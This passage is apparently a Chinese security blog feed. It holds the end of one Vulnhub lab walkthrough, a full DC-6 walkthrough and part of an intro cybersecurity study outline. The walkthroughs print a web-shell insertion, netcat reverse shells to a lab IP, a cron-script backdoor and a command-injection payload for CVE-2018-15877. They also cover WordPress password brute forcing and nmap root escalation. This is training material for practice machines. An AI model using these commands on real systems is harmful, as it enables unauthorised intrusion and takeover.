src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201102628741.png" alt="image-20221201102628741"></p><p>然后进到content界面直接修改随便一个文件，写入一句话木马</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201102938629.png" alt="image-20221201102938629"></p><p>连接成功，利用蚁剑的虚拟终端进行反弹shell</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201103452414.png" alt="image-20221201103452414"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234//在攻击机上执行</span><br><span class="line">nc -e /bin/sh 192.168.71.128 1234//在受害机上执行</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;//交互式shell</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201103751736.png" alt="image-20221201103751736"></p><h2 id="提权">提权</h2><p>之前的提权方式都用不了，就只能换个思路，前面提到想用<strong><a href="http://backups.sh">backups.sh</a></strong>进行反弹shell，发现www-data用户是有写入的权限的，那就同理利用其进行提权</p><p>可以直接在蚁剑里找到backups.sh直接加上<code>nc -e /bin/sh 192.168.71.128 1234</code></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201144758579.png" alt="image-20221201144758579"></p><p>也可以利用echo进行写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nc -e /bin/sh 192.168.71.128 1234&#x27;</span>&gt;&gt;/opt/scripts/backups.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cat</span> theflag.txt</span><br></pre></td></tr></table></figure><h2 id="flag">flag</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201144633041.png" alt="image-20221201144633041"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6复现</title>
      <link href="/posts/4971/"/>
      <url>/posts/4971/</url>
      
        <content type="html"><![CDATA[<h1>DC-6复现</h1><blockquote><h2 id="描述">描述</h2><p>DC-6 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这不是一个过于困难的挑战，因此对初学者来说应该很棒。</p><p>这一挑战的最终目标是获得根并阅读唯一的标志。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h2 id="线索">线索</h2><p>好吧，这并不是一个真正的线索，但对于那些只想继续工作的人来说，更多的是一些“我们不想花五年时间等待某个过程完成”的建议。</p><p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 这应该可以为您节省几年时间。;-)</p></blockquote><h1>信息收集</h1><p>获取ip地址以及开启的服务</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020192153759.png" alt="image-20221020192153759"></p><p>访问80端口的服务，并不能正常的访问到</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020195313552.png" alt="image-20221020195313552"></p><p>修改hosts文件，然后就可以正常访问了</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020195457215.png" alt="image-20221020195457215"></p><p>该网站是wordpress搭建的博客</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020195845417.png" alt="image-20221020195845417"></p><p>利用dirsearch扫出网站的后台登陆网站</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020201934903.png" alt="image-20221020201934903"></p><h1>爆破</h1><p>使用wpscan枚举爆破用户名</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020200347155.png" alt="image-20221020200347155"></p><p>新建users.txt并写入以上的用户名，作为后面的爆破字典</p><p>根据题目描述中的线索，新建一个密码字典</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020200746495.png" alt="image-20221020200746495"></p><p>直接使用命令会发现报错了，我现在用的这个版本的kali是经过了gz打包，所以要解压出来，可鞥不同版本会有所不同</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020201150488.png" alt="image-20221020201150488"></p><p>解压后再执行就成了</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020201334710.png" alt="image-20221020201334710"></p><p>利用wpscan爆破出网站的账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020202043925.png" alt="image-20221020202043925"></p><h1>登录（漏洞利用）</h1><p>利用爆破出的账号登录后台，发现一个ip转换工具</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020202859842.png" alt="image-20221020202859842"></p><p>经过百度得知Activity Monitor插件存在CVE-2018-15877远程命令执行漏洞</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020203048051.png" alt="image-20221020203048051"></p><p>执行下面的命令，证明该漏洞可用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| <span class="built_in">ls</span> /</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020203250683.png" alt="image-20221020203250683"></p><p>抓包改包，弹shell</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020204106275.png" alt="弹shell"></p><p>利用python将bash切换成交互模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221020204232671.png" alt="bash"></p><h1>敏感信息挖掘</h1><p>在home目录下发现了四个账号的文件夹</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022163144399.png" alt="ls"></p><p>graham文件夹中是没有东西的，<a href="http://xn--jensbackups-om8q8q75g4x2d7e4btmf4n0tkgwa.sh">jens文件夹里面有一个backups.sh</a>，mark文件夹的stuff文件夹中有一个things-to-do的文件，sarah文件夹里面也是空的</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022163549105.png" alt="jens"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022163500101.png" alt="mark"></p><p>从things-to-do文件中我们得知了graham的密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022163809535.png" alt="翻译"></p><p>直接切换用户（因为该机器还开启了22端口，所以也是可以利用ssh登录的）</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022164925248.png" alt="su"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022171716365.png" alt="ssh登录"></p><p>命令<code>sudo -l</code>列出当前用户可执行与无法执行的指令，发现可以免密登录jens</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022170024694.png" alt="列指令"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022165644469.png" alt="切换用户"></p><p>继续用<code>sudo -l</code>列出当前用户可执行与无法执行的指令，发现jens可以免密码运行root权限nmap，在提权中是可以使用nmap进行提权的，那就进行尝试</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022165805933.png" alt="列指令"></p><h1>提权（nmap提权）</h1><p>大佬总结的原理：nmap 可以执行脚本文件，可以创建一个文件并写入反弹 shell 的命令，默认用root 权限执行，所以反弹的 shell 也是 root</p><blockquote><ul><li><p>echo ‘os.execute(“/bin/bash”)’ &gt; shell.nse #创建一个 shell.nse 的文件，并写入os.execute(“/bin/bash”)</p></li><li><p>其中，–script用法：nmap --script=脚本名称 目标</p></li></ul></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022170709967.png" alt="image-20221022170709967"></p><p>提权成功，在root文件夹中找到flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221022171435028.png" alt="theflag"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络空间安全导论知识点题纲</title>
      <link href="/posts/13034/"/>
      <url>/posts/13034/</url>
      
        <content type="html"><![CDATA[<h1>第一章</h1><h2 id="一、网络安全的重要性？">一、网络安全的重要性？</h2><ol><li>网络安全事关政治安全</li><li>网络安全事关经济安全</li><li>网络安全事关文化安全</li><li>网络安全事关社会安全</li><li>网络安全事关国防安全</li></ol><h2 id="二、网络强国目标？">二、网络强国目标？</h2><p>建设网络强国的<strong>近期</strong>目标是:<strong>技术强</strong>，即要有自己的技术，有过硬的技术;<strong>基础强</strong>，即<br>要有良好的信息基础设施，形成实力雄厚的信息经济;<strong>内容强</strong>，即要有丰富全面的信息服<br>务，繁荣发展的网络文化;<strong>人才强</strong>，即要有高素质的网络安全和信息化人才队伍;<strong>国际话语</strong><br><strong>权强</strong>，即要积极开展双边、多边的互联网国际交流合作。</p><p>建设网络强国的<strong>中期</strong>目标是:建设网络强国的战略部署与“两个一百年”奋斗目标同<br>步推进，向着网络<strong>基础设施基本普及</strong>、<strong>自主创新能力显著增强</strong>、<strong>信息经济全面发展</strong>、<strong>网络安</strong><br><strong>全保障有力</strong>的目标不断前进。</p><p>建设网络强国的<strong>远期</strong>目标是:<strong>战略清晰</strong>，<strong>技术先进</strong>，<strong>产业领先</strong>，<strong>制网权尽在掌握</strong>，<strong>网络</strong><br><strong>安全坚不可摧</strong>。</p><h2 id="三、在维护网络空间安全和平需要遵循哪些原则？">三、在维护网络空间安全和平需要遵循哪些原则？</h2><h3 id="战略原则">战略原则</h3><ol><li>尊重维护网络空间主权</li><li>和平利用网络空间</li><li>依法治理网络空间</li><li>统筹网络安全与发展</li></ol><h2 id="四、如何树立正确的网络安全观？">四、如何树立正确的网络安全观？</h2><ol><li>网络安全是整体的而不是割裂的</li><li>网络安全是动态的而不是静态的</li><li>网络安全是开放的而不是封闭的</li><li>网络安全是相对的而不是绝对的</li><li>网络安全是共同的而不是孤立的</li></ol><h1>第二章</h1><h2 id="一、了解三个安全产品的功能和局限性。给出一个例子，要知道它是防火墙还是入侵系统（重点是防火墙和入侵系统）">一、了解三个安全产品的功能和局限性。给出一个例子，要知道它是防火墙还是入侵系统（重点是防火墙和入侵系统）</h2><h3 id="1-防火墙">1. 防火墙</h3><blockquote><p>概述：</p><p>使用防火墙来保护敏感的数据不被窃取和篡改，这里的防火墙是由计算机系统构成的。</p></blockquote><blockquote><p>功能：</p><ol><li>访问控制功能</li><li>内容控制功能</li><li>安全日志功能</li><li>集中管理功能</li><li>其他附加功能<ul><li>流量控制功能</li><li>NAT（网络地址转换）功能</li><li>VPN（虚拟专用网）功能</li></ul></li></ol></blockquote><blockquote><p>局限性：</p><ol><li>不能防范被保护网络内部人员发起的攻击</li><li>不能防范不经过防火墙的攻击</li><li>不能完全防止传送已感染病毒的软件或文件</li><li>不能防范数据驱动型攻击</li><li>不能防范不断更新的攻击方式</li></ol></blockquote><h3 id="2-入侵检测系统">2. 入侵检测系统</h3><blockquote><p>概述：</p><p>入侵检测系统（IDS）通过监视受保护系统或网络的状态，可以发现正在进行或已发生的攻击。</p></blockquote><blockquote><p>功能：</p><ol><li>监测用户和系统的活动</li><li>发现入侵行为</li><li>记录和报警</li></ol></blockquote><blockquote><p>分类：</p><ol><li>基于主机的入侵检测系统</li><li>基于网络的入侵检测系统</li></ol></blockquote><blockquote><p>局限性：</p><p>入侵检测系统不具有访问控制的能力,它通过对数据包流的分析，从数据流中过滤出可<br>疑数据包，通过与已知的人侵方式进行比较，确定人侵是否发生及人侵的类型并进行报警。然后网络管理员将根据报警信息确切了解所遭受的攻击并采取相应的措施。</p><p>入侵检测 系统的单独使用不能起到保护网络的作用，也不能独立地阻止任何一种攻击。<br>它在网络安全系统中所充当的角色是侦察和预警，协助网络管理员发现并处理已知的人侵。</p><p>入侵检测系统对攻击行为不能直接自动处理，而入侵检测系统和防火墙的联动也因为不<br>同厂商间的合作问题并没有取得很好的效果。后来出现了人侵防御系统(IPS) 的概念和产品。与人侵检测系统不同，人侵防御系统是串接在网络上的，能够丢弃所发现的攻击数据包，只允许其他正常通信流量通过。但是，因为人侵防御系统的阻断行为对网络影响极大,不容有失，人侵检测系统的漏报率.误报率需要保持较理想的水平。</p></blockquote><h3 id="3-恶意代码防护">3.恶意代码防护</h3><blockquote><p>概述：</p><p>恶意代码就是一个计算机程序或一段程序代码，执行后完成特定的功能。但与正常的计<br>算机软件功能不同，它是有恶意的，即起着破坏性的作用，如计算机病毒就是最常见的一类恶意代码。</p><p>随着软件应用的复杂化，软件中的“臭虫( Bug)”和安全漏洞不可避免，攻击者可以<br>针对漏洞编写恶意代码，以实现对系统的攻击，近年来甚至出现了漏洞发布当天就产生恶意攻击代码的“零日攻击”。随着互联网的迅速发展和广泛应用，恶意代码的传播速度非常快，使得目前计算环境中的新恶意代码的数量呈指数级增长。</p></blockquote><blockquote><p>分类：</p><ol><li>病毒（计算机病毒是一种靠修改其他程序来插人或进行自身复制，从而感染其他程序的一段程序。具有传染性、隐蔽性、潜伏性、名态性和破坏性等特征。）</li><li>蠕虫（蠕虫主要是指利用操作系统和应用程序漏洞进行传播，通过网络通信功能将自身从一个节点发送到另一个节点并启动运行的程序。此外，蠕虫会消耗内存和网络带宽，从而可能造成拒绝服务，导致计算机崩溃。）</li><li>特洛伊木马（指一个隐藏在合法程序中的非法程序。）</li><li>逻辑炸弹（逻辑炸弹可以理解为在特定逻辑条件满足时实施破坏的计算机程序。）</li></ol></blockquote><blockquote><p>恶意代码处置：</p><ol><li>检测阶段</li><li>反应阶段</li><li>恢复阶段</li></ol></blockquote><h2 id="二、安全机制有哪些">二、安全机制有哪些</h2><ol><li>加密机制</li><li>数字签名机制</li><li>访问控制机制</li><li>数据完整性机制</li><li>鉴别交换机制</li><li>通信业务填充机制</li><li>路由选择控制机制</li><li>公证机制</li></ol><h2 id="三、安全服务有哪些">三、安全服务有哪些</h2><ol><li>鉴别</li><li>访问控制</li><li>数据完整性</li><li>数据保密性</li><li>抗抵赖<ul><li>原发抗抵赖</li><li>接收抗抵赖</li></ul></li></ol><h2 id="四、网络安全的基本属性">四、网络安全的基本属性</h2><ol><li>保密性（保密性是指信息不被泄露给非授权的用户实体或过程，或被其利用的特性。）</li><li>完整性（完整性是指信息未经授权不能进行更改的特性。）</li><li>可用性（可用性是信息可被授权实体访问并按需求使用的特性。）</li></ol><h1>第三章</h1><h2 id="一、会算RSA、课后习题有一题">一、会算RSA、课后习题有一题</h2><h3 id="密钥对的产生">密钥对的产生</h3><ol><li><p>选择两个大素数p和q</p></li><li><p>计算：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi><mo separator="true">,</mo><mi>ψ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n=pq,\psi(n)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p></li><li><p>随机选择一整数e，要求e和φ(n)互素。</p></li><li><p>找到一个整数d，满足：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mtext>（</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mi>ψ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed\equiv 1（mod \psi(n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span></span></p></li></ol><h3 id="加解密">加解密</h3><p>对明文m进行加密：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=m^e(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>对密文c进行解密：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=c^d(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h3 id="解密例题">解密例题</h3><blockquote><p>密文C=10，公钥e=5，n=35，求明文</p></blockquote><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><mn>35</mn><mo>=</mo><mn>5</mn><mo>×</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">n=35=5\times7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">35</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>ψ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">\psi(n)=(5-1)\times(7-1)=24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>5</mn><mi>d</mi><mo>=</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>24</mn><mo>⇒</mo><mi>d</mi><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">5d = 1mod24\Rightarrow d=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">5</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">24</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mn>35</mn><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">m=c^d(mod n)=10^5mod35=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">35</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span></span></p><h2 id="二、了解我国在加密算法领域的成就">二、了解我国在加密算法领域的成就</h2><h3 id="国产密码算法">国产密码算法</h3><p><strong>密码算法是国之重器，是各国之间战略竞争的制高点。必须掌握自主密码技术，才能够<br>赢得安全和发展的主动权。自20世纪末发布《商用密码管理条例》以来，我国的密码研究<br>和密码应用水平快速发展。目前，我国已发布了40多项密码标准，公布了SM2、SM3、 SM4<br>等系列密码算法，形成了较为完整的密码标准体系。国产密码算法祖冲之(ZUC) 算法已被<br>采纳为第四代移动通信国际密码标准，是我国第一个 成为国际标准的密码算法。</strong></p><h2 id="三、密码攻击">三、密码攻击</h2><h3 id="1、攻击方法">1、攻击方法</h3><ol><li>穷举攻击</li><li>统计分析攻击</li><li>数学求解攻击</li></ol><h3 id="2、攻击分类">2、攻击分类</h3><ol><li>唯密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ol><h1>第四章</h1><h2 id="一、攻击的类型有哪些？要会判断属于哪一种攻击类型？针对主动攻击的具体攻击手段有哪些？">一、攻击的类型有哪些？要会判断属于哪一种攻击类型？针对主动攻击的具体攻击手段有哪些？</h2><h3 